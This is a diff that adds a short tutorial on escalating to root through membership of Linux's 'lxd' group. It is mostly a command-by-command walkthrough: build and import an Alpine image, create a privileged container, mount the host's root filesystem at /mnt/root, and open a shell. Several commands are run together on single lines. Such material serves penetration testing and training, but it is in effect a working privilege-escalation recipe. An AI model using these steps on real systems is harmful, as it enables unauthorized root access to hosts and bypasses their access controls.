@@ -1,0 +1,33 @@
+LXD is a system container manager, and LXC is its underlying container runtime. They are often used to run full Linux distributions within containers.
+
+If a user is part of the ‘lxd’ group on a system, they can exploit this membership to escalate their privileges to root.
+
+This is because members of the ‘lxd’ group have significant control over container creation and management, which can be leveraged to gain access to the host system.
+
+Steps to Perform LXD/LXC Group Privilege Escalation The following are the steps to execute LXD/LXC group privilege escalation: 
+
+▪ Run the following commands to create an Alpine docker image:
+mkdir -p $HOME/ContainerImages/alpine/ cd $HOME/ContainerImages/alpine/ wget https://raw.githubusercontent.com/lxc/lxc- ci/master/images/alpine.yaml 
+
+▪ Now, run the following command to create a container: sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml image.release=3.18
+
+▪ After preparing the Alpine Linux image, run the following command to import Alpine image into LXD: 
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine Note: lxd.tar.xz and rootfs.squashfs are example file names.
+
+▪ Run the following command to check for the image in the container: lxc image list
+
+▪ Run the following command to create a container and list the containers: lxc init alpine privesc -c security.privileged=true
+
+▪ Run the following command to list the containers: lxc list lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+▪ Run the following command to execute the container and gain root access: lxc start privesc lxc exec privesc /bin/sh
+
+
+
+
+
+
+
+
+
+
